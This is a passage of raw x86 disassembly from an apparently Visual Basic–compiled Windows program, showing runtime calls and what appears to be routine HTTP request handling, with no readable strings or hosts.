  4046b8:	56                   	push   %esi
  4046b9:	ff 15 f0 10 40 00    	call   *0x4010f0
  4046bf:	50                   	push   %eax
  4046c0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4046c3:	50                   	push   %eax
  4046c4:	ff 15 74 10 40 00    	call   *0x401074
  4046ca:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4046cd:	51                   	push   %ecx
  4046ce:	ff 15 10 10 40 00    	call   *0x401010
  4046d4:	8b d0                	mov    %eax,%edx
  4046d6:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4046d9:	ff 15 38 11 40 00    	call   *0x401138
  4046df:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4046e2:	ff d3                	call   *%ebx
  4046e4:	56                   	push   %esi
  4046e5:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4046e8:	52                   	push   %edx
  4046e9:	57                   	push   %edi
  4046ea:	ff 15 80 10 40 00    	call   *0x401080
  4046f0:	56                   	push   %esi
  4046f1:	ff 15 78 10 40 00    	call   *0x401078
  4046f7:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4046fa:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4046fd:	ff 15 00 11 40 00    	call   *0x401100
  404703:	ff 15 44 10 40 00    	call   *0x401044
  404709:	68 4f 47 40 00       	push   $0x40474f
  40470e:	eb 35                	jmp    0x404745
  404710:	ff 15 48 10 40 00    	call   *0x401048
  404716:	ff 15 44 10 40 00    	call   *0x401044
  40471c:	68 4f 47 40 00       	push   $0x40474f
  404721:	eb 22                	jmp    0x404745
  404723:	f6 45 f4 04          	testb  $0x4,-0xc(%ebp)
  404727:	74 09                	je     0x404732
  404729:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40472c:	ff 15 64 11 40 00    	call   *0x401164
  404732:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404735:	ff 15 64 11 40 00    	call   *0x401164
  40473b:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40473e:	ff 15 0c 10 40 00    	call   *0x40100c
  404744:	c3                   	ret
  404745:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  404748:	ff 15 64 11 40 00    	call   *0x401164
  40474e:	c3                   	ret
  40474f:	8b 45 10             	mov    0x10(%ebp),%eax
  404752:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404755:	89 08                	mov    %ecx,(%eax)
  404757:	33 c0                	xor    %eax,%eax
  404759:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40475c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404763:	5f                   	pop    %edi
  404764:	5e                   	pop    %esi
  404765:	5b                   	pop    %ebx
  404766:	8b e5                	mov    %ebp,%esp
  404768:	5d                   	pop    %ebp
  404769:	c2 0c 00             	ret    $0xc
  40476c:	90                   	nop
  40476d:	90                   	nop
  40476e:	90                   	nop
  40476f:	90                   	nop
  404770:	55                   	push   %ebp
  404771:	8b ec                	mov    %esp,%ebp
  404773:	83 ec 18             	sub    $0x18,%esp
  404776:	68 a6 14 40 00       	push   $0x4014a6
  40477b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404781:	50                   	push   %eax
  404782:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404789:	b8 f4 00 00 00       	mov    $0xf4,%eax
  40478e:	e8 0d cd ff ff       	call   0x4014a0
  404793:	53                   	push   %ebx
  404794:	56                   	push   %esi
  404795:	57                   	push   %edi
  404796:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404799:	c7 45 ec 58 12 40 00 	movl   $0x401258,-0x14(%ebp)
  4047a0:	8b 45 08             	mov    0x8(%ebp),%eax
  4047a3:	83 e0 01             	and    $0x1,%eax
  4047a6:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4047a9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4047ac:	83 e1 fe             	and    $0xfffffffe,%ecx
  4047af:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4047b2:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4047b9:	8b 55 08             	mov    0x8(%ebp),%edx
  4047bc:	8b 02                	mov    (%edx),%eax
  4047be:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4047c1:	51                   	push   %ecx
  4047c2:	ff 50 04             	call   *0x4(%eax)
  4047c5:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4047cc:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4047d3:	6a ff                	push   $0xffffffff
  4047d5:	ff 15 4c 10 40 00    	call   *0x40104c
  4047db:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  4047e2:	8b 55 08             	mov    0x8(%ebp),%edx
  4047e5:	8b 02                	mov    (%edx),%eax
  4047e7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4047ea:	51                   	push   %ecx
  4047eb:	ff 90 10 03 00 00    	call   *0x310(%eax)
  4047f1:	50                   	push   %eax
  4047f2:	8d 55 94             	lea    -0x6c(%ebp),%edx
  4047f5:	52                   	push   %edx
  4047f6:	ff 15 50 10 40 00    	call   *0x401050
  4047fc:	89 85 2c ff ff ff    	mov    %eax,-0xd4(%ebp)
  404802:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404805:	50                   	push   %eax
  404806:	8b 8d 2c ff ff ff    	mov    -0xd4(%ebp),%ecx
  40480c:	8b 11                	mov    (%ecx),%edx
  40480e:	8b 85 2c ff ff ff    	mov    -0xd4(%ebp),%eax
  404814:	50                   	push   %eax
  404815:	ff 52 50             	call   *0x50(%edx)
  404818:	db e2                	fnclex
  40481a:	89 85 28 ff ff ff    	mov    %eax,-0xd8(%ebp)
  404820:	83 bd 28 ff ff ff 00 	cmpl   $0x0,-0xd8(%ebp)
  404827:	7d 23                	jge    0x40484c
  404829:	6a 50                	push   $0x50
  40482b:	68 24 31 40 00       	push   $0x403124
  404830:	8b 8d 2c ff ff ff    	mov    -0xd4(%ebp),%ecx
  404836:	51                   	push   %ecx
  404837:	8b 95 28 ff ff ff    	mov    -0xd8(%ebp),%edx
  40483d:	52                   	push   %edx
  40483e:	ff 15 38 10 40 00    	call   *0x401038
  404844:	89 85 00 ff ff ff    	mov    %eax,-0x100(%ebp)
  40484a:	eb 0a                	jmp    0x404856
  40484c:	c7 85 00 ff ff ff 00 	movl   $0x0,-0x100(%ebp)
  404853:	00 00 00 
  404856:	8b 45 ac             	mov    -0x54(%ebp),%eax
  404859:	50                   	push   %eax
  40485a:	ff 15 f4 10 40 00    	call   *0x4010f4
  404860:	dc 1d 10 13 40 00    	fcompl 0x401310
  404866:	df e0                	fnstsw %ax
  404868:	f6 c4 40             	test   $0x40,%ah
  40486b:	74 0c                	je     0x404879
  40486d:	c7 85 fc fe ff ff 01 	movl   $0x1,-0x104(%ebp)
  404874:	00 00 00 
  404877:	eb 0a                	jmp    0x404883
  404879:	c7 85 fc fe ff ff 00 	movl   $0x0,-0x104(%ebp)
  404880:	00 00 00 
  404883:	8b 8d fc fe ff ff    	mov    -0x104(%ebp),%ecx
  404889:	f7 d9                	neg    %ecx
  40488b:	66 89 8d 24 ff ff ff 	mov    %cx,-0xdc(%ebp)
  404892:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404895:	ff 15 64 11 40 00    	call   *0x401164
  40489b:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  40489e:	ff 15 60 11 40 00    	call   *0x401160
  4048a4:	0f bf 95 24 ff ff ff 	movswl -0xdc(%ebp),%edx
  4048ab:	85 d2                	test   %edx,%edx
  4048ad:	0f 84 ab 09 00 00    	je     0x40525e
  4048b3:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4048ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4048bd:	8b 08                	mov    (%eax),%ecx
  4048bf:	8b 55 08             	mov    0x8(%ebp),%edx
  4048c2:	52                   	push   %edx
  4048c3:	ff 91 10 03 00 00    	call   *0x310(%ecx)
  4048c9:	50                   	push   %eax
  4048ca:	8d 45 94             	lea    -0x6c(%ebp),%eax
  4048cd:	50                   	push   %eax
  4048ce:	ff 15 50 10 40 00    	call   *0x401050
  4048d4:	89 85 2c ff ff ff    	mov    %eax,-0xd4(%ebp)
  4048da:	6a 00                	push   $0x0
  4048dc:	ff 15 00 10 40 00    	call   *0x401000
  4048e2:	8b d0                	mov    %eax,%edx
  4048e4:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4048e7:	ff 15 38 11 40 00    	call   *0x401138
  4048ed:	50                   	push   %eax
  4048ee:	8b 8d 2c ff ff ff    	mov    -0xd4(%ebp),%ecx
  4048f4:	8b 11                	mov    (%ecx),%edx
  4048f6:	8b 85 2c ff ff ff    	mov    -0xd4(%ebp),%eax
  4048fc:	50                   	push   %eax
  4048fd:	ff 52 54             	call   *0x54(%edx)
  404900:	db e2                	fnclex
  404902:	89 85 28 ff ff ff    	mov    %eax,-0xd8(%ebp)
  404908:	83 bd 28 ff ff ff 00 	cmpl   $0x0,-0xd8(%ebp)
  40490f:	7d 23                	jge    0x404934
  404911:	6a 54                	push   $0x54
  404913:	68 24 31 40 00       	push   $0x403124
  404918:	8b 8d 2c ff ff ff    	mov    -0xd4(%ebp),%ecx
  40491e:	51                   	push   %ecx
  40491f:	8b 95 28 ff ff ff    	mov    -0xd8(%ebp),%edx
  404925:	52                   	push   %edx
  404926:	ff 15 38 10 40 00    	call   *0x401038
  40492c:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  404932:	eb 0a                	jmp    0x40493e
  404934:	c7 85 f8 fe ff ff 00 	movl   $0x0,-0x108(%ebp)
  40493b:	00 00 00 
  40493e:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404941:	ff 15 64 11 40 00    	call   *0x401164
  404947:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  40494a:	ff 15 60 11 40 00    	call   *0x401160
  404950:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  404957:	6a 00                	push   $0x0
  404959:	6a 00                	push   $0x0
  40495b:	6a 00                	push   $0x0
  40495d:	6a 00                	push   $0x0
  40495f:	68 8c 26 40 00       	push   $0x40268c
  404964:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404967:	50                   	push   %eax
  404968:	ff 15 24 11 40 00    	call   *0x401124
  40496e:	50                   	push   %eax
  40496f:	e8 20 e1 ff ff       	call   0x402a94
  404974:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  40497a:	ff 15 34 10 40 00    	call   *0x401034
  404980:	8b 8d 38 ff ff ff    	mov    -0xc8(%ebp),%ecx
  404986:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  404989:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40498c:	ff 15 64 11 40 00    	call   *0x401164
  404992:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  404999:	6a 00                	push   $0x0
  40499b:	68 00 00 00 80       	push   $0x80000000
  4049a0:	6a 00                	push   $0x0
  4049a2:	6a 00                	push   $0x0
  4049a4:	68 38 31 40 00       	push   $0x403138
  4049a9:	68 58 26 40 00       	push   $0x402658
  4049ae:	ff 15 28 10 40 00    	call   *0x401028
  4049b4:	8b d0                	mov    %eax,%edx
  4049b6:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4049b9:	ff 15 38 11 40 00    	call   *0x401138
  4049bf:	50                   	push   %eax
  4049c0:	68 4c 31 40 00       	push   $0x40314c
  4049c5:	ff 15 28 10 40 00    	call   *0x401028
  4049cb:	8b d0                	mov    %eax,%edx
  4049cd:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4049d0:	ff 15 38 11 40 00    	call   *0x401138
  4049d6:	50                   	push   %eax
  4049d7:	8b 55 08             	mov    0x8(%ebp),%edx
  4049da:	8b 42 38             	mov    0x38(%edx),%eax
  4049dd:	50                   	push   %eax
  4049de:	ff 15 28 10 40 00    	call   *0x401028
  4049e4:	8b d0                	mov    %eax,%edx
  4049e6:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4049e9:	ff 15 38 11 40 00    	call   *0x401138
  4049ef:	50                   	push   %eax
  4049f0:	68 54 31 40 00       	push   $0x403154
  4049f5:	ff 15 28 10 40 00    	call   *0x401028
  4049fb:	8b d0                	mov    %eax,%edx
  4049fd:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  404a00:	ff 15 38 11 40 00    	call   *0x401138
  404a06:	50                   	push   %eax
  404a07:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  404a0a:	51                   	push   %ecx
  404a0b:	ff 15 24 11 40 00    	call   *0x401124
  404a11:	50                   	push   %eax
  404a12:	8b 55 c0             	mov    -0x40(%ebp),%edx
  404a15:	52                   	push   %edx
  404a16:	e8 c1 e2 ff ff       	call   0x402cdc
  404a1b:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  404a21:	ff 15 34 10 40 00    	call   *0x401034
  404a27:	8b 85 38 ff ff ff    	mov    -0xc8(%ebp),%eax
  404a2d:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404a30:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  404a33:	51                   	push   %ecx
  404a34:	8d 55 a0             	lea    -0x60(%ebp),%edx
  404a37:	52                   	push   %edx
  404a38:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  404a3b:	50                   	push   %eax
  404a3c:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404a3f:	51                   	push   %ecx
  404a40:	8d 55 ac             	lea    -0x54(%ebp),%edx
  404a43:	52                   	push   %edx
  404a44:	6a 05                	push   $0x5
  404a46:	ff 15 08 11 40 00    	call   *0x401108
  404a4c:	83 c4 18             	add    $0x18,%esp
  404a4f:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  404a56:	68 e8 03 00 00       	push   $0x3e8
  404a5b:	8d 45 80             	lea    -0x80(%ebp),%eax
  404a5e:	50                   	push   %eax
  404a5f:	ff 15 74 10 40 00    	call   *0x401074
  404a65:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  404a68:	51                   	push   %ecx
  404a69:	ff 15 10 10 40 00    	call   *0x401010
  404a6f:	8b d0                	mov    %eax,%edx
  404a71:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404a74:	ff 15 38 11 40 00    	call   *0x401138
  404a7a:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  404a7d:	ff 15 0c 10 40 00    	call   *0x40100c
  404a83:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  404a8a:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404a8d:	52                   	push   %edx
  404a8e:	68 e8 03 00 00       	push   $0x3e8
  404a93:	8b 45 bc             	mov    -0x44(%ebp),%eax
  404a96:	50                   	push   %eax
  404a97:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404a9a:	51                   	push   %ecx
  404a9b:	ff 15 24 11 40 00    	call   *0x401124
  404aa1:	50                   	push   %eax
  404aa2:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  404aa5:	52                   	push   %edx
  404aa6:	e8 81 e0 ff ff       	call   0x402b2c
  404aab:	66 89 85 3c ff ff ff 	mov    %ax,-0xc4(%ebp)
  404ab2:	ff 15 34 10 40 00    	call   *0x401034
  404ab8:	8b 45 ac             	mov    -0x54(%ebp),%eax
  404abb:	50                   	push   %eax
  404abc:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404abf:	51                   	push   %ecx
  404ac0:	ff 15 b8 10 40 00    	call   *0x4010b8
  404ac6:	0f bf 95 3c ff ff ff 	movswl -0xc4(%ebp),%edx
  404acd:	89 55 cc             	mov    %edx,-0x34(%ebp)
  404ad0:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404ad3:	ff 15 64 11 40 00    	call   *0x401164
  404ad9:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  404ae0:	c7 45 88 04 00 00 00 	movl   $0x4,-0x78(%ebp)
  404ae7:	c7 45 80 02 00 00 00 	movl   $0x2,-0x80(%ebp)
  404aee:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404af1:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%ebp)
  404af7:	c7 85 50 ff ff ff 08 	movl   $0x4008,-0xb0(%ebp)
  404afe:	40 00 00 
  404b01:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  404b04:	51                   	push   %ecx
  404b05:	6a 01                	push   $0x1
  404b07:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404b0d:	52                   	push   %edx
  404b0e:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  404b14:	50                   	push   %eax
  404b15:	ff 15 6c 10 40 00    	call   *0x40106c
  404b1b:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  404b21:	51                   	push   %ecx
  404b22:	ff 15 10 10 40 00    	call   *0x401010
  404b28:	8b d0                	mov    %eax,%edx
  404b2a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404b2d:	ff 15 38 11 40 00    	call   *0x401138
  404b33:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  404b39:	52                   	push   %edx
  404b3a:	8d 45 80             	lea    -0x80(%ebp),%eax
  404b3d:	50                   	push   %eax
  404b3e:	6a 02                	push   $0x2
  404b40:	ff 15 18 10 40 00    	call   *0x401018
  404b46:	83 c4 0c             	add    $0xc,%esp
  404b49:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  404b50:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404b53:	89 8d 58 ff ff ff    	mov    %ecx,-0xa8(%ebp)
  404b59:	c7 85 50 ff ff ff 08 	movl   $0x4008,-0xb0(%ebp)
  404b60:	40 00 00 
  404b63:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404b69:	52                   	push   %edx
  404b6a:	8d 45 80             	lea    -0x80(%ebp),%eax
  404b6d:	50                   	push   %eax
  404b6e:	ff 15 64 10 40 00    	call   *0x401064
  404b74:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  404b77:	51                   	push   %ecx
  404b78:	ff 15 14 10 40 00    	call   *0x401014
  404b7e:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  404b84:	c7 85 70 ff ff ff 03 	movl   $0x3,-0x90(%ebp)
  404b8b:	00 00 00 
  404b8e:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  404b94:	52                   	push   %edx
  404b95:	6a 05                	push   $0x5
  404b97:	8d 45 80             	lea    -0x80(%ebp),%eax
  404b9a:	50                   	push   %eax
  404b9b:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  404ba1:	51                   	push   %ecx
  404ba2:	ff 15 6c 10 40 00    	call   *0x40106c
  404ba8:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  404bae:	52                   	push   %edx
  404baf:	ff 15 10 10 40 00    	call   *0x401010
  404bb5:	8b d0                	mov    %eax,%edx
  404bb7:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404bba:	ff 15 38 11 40 00    	call   *0x401138
  404bc0:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  404bc6:	50                   	push   %eax
  404bc7:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  404bcd:	51                   	push   %ecx
  404bce:	8d 55 80             	lea    -0x80(%ebp),%edx
  404bd1:	52                   	push   %edx
  404bd2:	6a 03                	push   $0x3
  404bd4:	ff 15 18 10 40 00    	call   *0x401018
  404bda:	83 c4 10             	add    $0x10,%esp
  404bdd:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  404be4:	8b 45 b8             	mov    -0x48(%ebp),%eax
  404be7:	50                   	push   %eax
  404be8:	e8 23 e0 ff ff       	call   0x402c10
  404bed:	ff 15 34 10 40 00    	call   *0x401034
  404bf3:	c7 45 fc 0c 00 00 00 	movl   $0xc,-0x4(%ebp)
  404bfa:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  404bfd:	51                   	push   %ecx
  404bfe:	e8 0d e0 ff ff       	call   0x402c10
  404c03:	ff 15 34 10 40 00    	call   *0x401034
  404c09:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
  404c10:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  404c13:	52                   	push   %edx
  404c14:	e8 f7 df ff ff       	call   0x402c10
  404c19:	ff 15 34 10 40 00    	call   *0x401034
  404c1f:	c7 45 fc 0e 00 00 00 	movl   $0xe,-0x4(%ebp)
  404c26:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404c29:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  404c2f:	ff 15 00 11 40 00    	call   *0x401100
  404c35:	c7 45 fc 0f 00 00 00 	movl   $0xf,-0x4(%ebp)
  404c3c:	8b 85 1c ff ff ff    	mov    -0xe4(%ebp),%eax
  404c42:	50                   	push   %eax
  404c43:	68 64 31 40 00       	push   $0x403164
  404c48:	ff 15 84 10 40 00    	call   *0x401084
  404c4e:	85 c0                	test   %eax,%eax
  404c50:	0f 85 92 02 00 00    	jne    0x404ee8
  404c56:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
  404c5d:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  404c60:	51                   	push   %ecx
  404c61:	ff 15 14 10 40 00    	call   *0x401014
  404c67:	83 e8 01             	sub    $0x1,%eax
  404c6a:	0f 80 e3 07 00 00    	jo     0x405453
  404c70:	89 45 88             	mov    %eax,-0x78(%ebp)
  404c73:	c7 45 80 03 00 00 00 	movl   $0x3,-0x80(%ebp)
  404c7a:	8d 55 c8             	lea    -0x38(%ebp),%edx
  404c7d:	89 95 58 ff ff ff    	mov    %edx,-0xa8(%ebp)
  404c83:	c7 85 50 ff ff ff 08 	movl   $0x4008,-0xb0(%ebp)
  404c8a:	40 00 00 
  404c8d:	8d 45 80             	lea    -0x80(%ebp),%eax
  404c90:	50                   	push   %eax
  404c91:	6a 01                	push   $0x1
  404c93:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  404c99:	51                   	push   %ecx
  404c9a:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  404ca0:	52                   	push   %edx
  404ca1:	ff 15 6c 10 40 00    	call   *0x40106c
  404ca7:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  404cad:	50                   	push   %eax
  404cae:	ff 15 10 10 40 00    	call   *0x401010
  404cb4:	8b d0                	mov    %eax,%edx
  404cb6:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404cb9:	ff 15 38 11 40 00    	call   *0x401138
  404cbf:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  404cc5:	51                   	push   %ecx
  404cc6:	8d 55 80             	lea    -0x80(%ebp),%edx
  404cc9:	52                   	push   %edx
  404cca:	6a 02                	push   $0x2
  404ccc:	ff 15 18 10 40 00    	call   *0x401018
  404cd2:	83 c4 0c             	add    $0xc,%esp
  404cd5:	c7 45 fc 11 00 00 00 	movl   $0x11,-0x4(%ebp)
  404cdc:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404cdf:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%ebp)
  404ce5:	c7 85 50 ff ff ff 08 	movl   $0x4008,-0xb0(%ebp)
  404cec:	40 00 00 
  404cef:	6a 00                	push   $0x0
  404cf1:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  404cf7:	51                   	push   %ecx
  404cf8:	ff 15 a4 10 40 00    	call   *0x4010a4
  404cfe:	dd 9d 30 ff ff ff    	fstpl  -0xd0(%ebp)
  404d04:	c7 45 fc 12 00 00 00 	movl   $0x12,-0x4(%ebp)
  404d0b:	6a 00                	push   $0x0
  404d0d:	6a 00                	push   $0x0
  404d0f:	6a 00                	push   $0x0
  404d11:	6a 00                	push   $0x0
  404d13:	68 8c 26 40 00       	push   $0x40268c
  404d18:	8d 55 ac             	lea    -0x54(%ebp),%edx
  404d1b:	52                   	push   %edx
  404d1c:	ff 15 24 11 40 00    	call   *0x401124
  404d22:	50                   	push   %eax
  404d23:	e8 6c dd ff ff       	call   0x402a94
  404d28:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  404d2e:	ff 15 34 10 40 00    	call   *0x401034
  404d34:	8b 85 38 ff ff ff    	mov    -0xc8(%ebp),%eax
  404d3a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404d3d:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404d40:	ff 15 64 11 40 00    	call   *0x401164
  404d46:	c7 45 fc 13 00 00 00 	movl   $0x13,-0x4(%ebp)
  404d4d:	6a 00                	push   $0x0
  404d4f:	6a 00                	push   $0x0
  404d51:	6a 03                	push   $0x3
  404d53:	68 74 31 40 00       	push   $0x403174
  404d58:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  404d5b:	51                   	push   %ecx
  404d5c:	ff 15 24 11 40 00    	call   *0x401124
  404d62:	50                   	push   %eax
  404d63:	68 74 31 40 00       	push   $0x403174
  404d68:	8d 55 a8             	lea    -0x58(%ebp),%edx
  404d6b:	52                   	push   %edx
  404d6c:	ff 15 24 11 40 00    	call   *0x401124
  404d72:	50                   	push   %eax
  404d73:	6a 50                	push   $0x50
  404d75:	68 58 26 40 00       	push   $0x402658
  404d7a:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404d7d:	50                   	push   %eax
  404d7e:	ff 15 24 11 40 00    	call   *0x401124
  404d84:	50                   	push   %eax
  404d85:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  404d88:	51                   	push   %ecx
  404d89:	e8 52 dd ff ff       	call   0x402ae0
  404d8e:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  404d94:	ff 15 34 10 40 00    	call   *0x401034
  404d9a:	8b 95 38 ff ff ff    	mov    -0xc8(%ebp),%edx
  404da0:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  404da3:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  404da6:	50                   	push   %eax
  404da7:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404daa:	51                   	push   %ecx
  404dab:	8d 55 ac             	lea    -0x54(%ebp),%edx
  404dae:	52                   	push   %edx
  404daf:	6a 03                	push   $0x3
  404db1:	ff 15 08 11 40 00    	call   *0x401108
  404db7:	83 c4 10             	add    $0x10,%esp
  404dba:	c7 45 fc 14 00 00 00 	movl   $0x14,-0x4(%ebp)
  404dc1:	6a 00                	push   $0x0
  404dc3:	68 00 00 00 80       	push   $0x80000000
  404dc8:	6a 00                	push   $0x0
  404dca:	6a 00                	push   $0x0
  404dcc:	68 00 2f 40 00       	push   $0x402f00
  404dd1:	8d 45 98             	lea    -0x68(%ebp),%eax
  404dd4:	50                   	push   %eax
  404dd5:	ff 15 24 11 40 00    	call   *0x401124
  404ddb:	50                   	push   %eax
  404ddc:	68 88 31 40 00       	push   $0x403188
  404de1:	68 b0 31 40 00       	push   $0x4031b0
  404de6:	ff 15 28 10 40 00    	call   *0x401028
  404dec:	8b d0                	mov    %eax,%edx
  404dee:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404df1:	ff 15 38 11 40 00    	call   *0x401138
  404df7:	50                   	push   %eax
  404df8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404dfb:	8b 51 38             	mov    0x38(%ecx),%edx
  404dfe:	52                   	push   %edx
  404dff:	ff 15 28 10 40 00    	call   *0x401028
  404e05:	8b d0                	mov    %eax,%edx
  404e07:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404e0a:	ff 15 38 11 40 00    	call   *0x401138
  404e10:	50                   	push   %eax
  404e11:	68 54 31 40 00       	push   $0x403154
  404e16:	ff 15 28 10 40 00    	call   *0x401028
  404e1c:	8b d0                	mov    %eax,%edx
  404e1e:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  404e21:	ff 15 38 11 40 00    	call   *0x401138
  404e27:	50                   	push   %eax
  404e28:	8d 45 9c             	lea    -0x64(%ebp),%eax
  404e2b:	50                   	push   %eax
  404e2c:	ff 15 24 11 40 00    	call   *0x401124
  404e32:	50                   	push   %eax
  404e33:	68 7c 31 40 00       	push   $0x40317c
  404e38:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  404e3b:	51                   	push   %ecx
  404e3c:	ff 15 24 11 40 00    	call   *0x401124
  404e42:	50                   	push   %eax
  404e43:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  404e46:	52                   	push   %edx
  404e47:	e8 2c dd ff ff       	call   0x402b78
  404e4c:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  404e52:	ff 15 34 10 40 00    	call   *0x401034
  404e58:	8b 85 38 ff ff ff    	mov    -0xc8(%ebp),%eax
  404e5e:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404e61:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  404e64:	51                   	push   %ecx
  404e65:	8d 55 9c             	lea    -0x64(%ebp),%edx
  404e68:	52                   	push   %edx
  404e69:	8d 45 a0             	lea    -0x60(%ebp),%eax
  404e6c:	50                   	push   %eax
  404e6d:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  404e70:	51                   	push   %ecx
  404e71:	8d 55 a8             	lea    -0x58(%ebp),%edx
  404e74:	52                   	push   %edx
  404e75:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404e78:	50                   	push   %eax
  404e79:	6a 06                	push   $0x6
  404e7b:	ff 15 08 11 40 00    	call   *0x401108
  404e81:	83 c4 1c             	add    $0x1c,%esp
